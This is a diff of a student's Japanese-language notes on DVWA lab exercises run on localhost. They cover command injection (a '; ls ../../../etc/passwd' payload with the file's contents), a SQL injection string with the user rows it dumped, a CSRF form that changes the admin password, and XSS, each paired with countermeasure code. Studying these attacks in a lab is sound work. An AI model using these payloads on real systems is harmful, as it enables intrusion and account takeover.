@@ -12,7 +12,7 @@
 
 - 被害
 
-なりすまし利用をさえてしまう。
+なりすましに利用をさえてしまう。
 
 - 対処法
 
@@ -104,3 +104,121 @@ https://qiita.com/wanko5296/items/142b5b82485b0196a2da
 
 ## 課題3
 
+### コマンドラインインジェクション
+
+```
+;  ls ../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+### sql インジェクション
+
+http://localhost/vulnerabilities/sqli/
+
+```
+aa'or'a'='a
+
+ID: aa'or'a'='a
+First name: admin
+Surname: admin
+ID: aa'or'a'='a
+First name: Gordon
+Surname: Brown
+ID: aa'or'a'='a
+First name: Hack
+Surname: Me
+ID: aa'or'a'='a
+First name: Pablo
+Surname: Picasso
+ID: aa'or'a'='a
+First name: Bob
+Surname: Smith
+```
+
+- 対策
+
+エスケープするのだと思う
+
+### CSRF
+
+1.下記のようなhtmlを作成する
+
+※actionを指定
+
+```
+<form action="http://localhost/vulnerabilities/csrf" method="GET">
+    New password:<br />
+    <input type="password" AUTOCOMPLETE="off" name="password_new"><br />
+    Confirm new password:<br />
+    <input type="password" AUTOCOMPLETE="off" name="password_conf"><br />
+    <br />
+    <input type="submit" value="Change" name="Change">
+
+</form>
+
+```
+
+2.passeordをadminに変更
+
+3.パスワード変更のページへ移動した
+
+
+- 対策コード
+
+```
+## before そのまま受け取っている
+$pass_new  = $_GET[ 'password_new' ];
+$pass_conf = $_GET[ 'password_conf' ];
+
+## after
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+```
+
+
+### XSS
+
+cookieなどを値を送る事はできなかったのですが、scriptタグは実行できました。（alertメソッド）
+
+こちらではscriptが文字列になる事を確認
+https://blog1127.herokuapp.com/blogs/4
+
+※参考
+https://qiita.com/KPenguin/items/783caef6a43e594ed7cd
+
+- 対策コード
+
+コードをみると
+
+下記のところでエスケープが上手くできていない様子で、特定の文字はエスケープする
+
+```
+## セキュリティ Lowの場合
+ $name = mysql_real_escape_string( $name );
+
+## セキュリティ hightの場合
+$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
+    $name = mysql_real_escape_string( $name );
+
+```
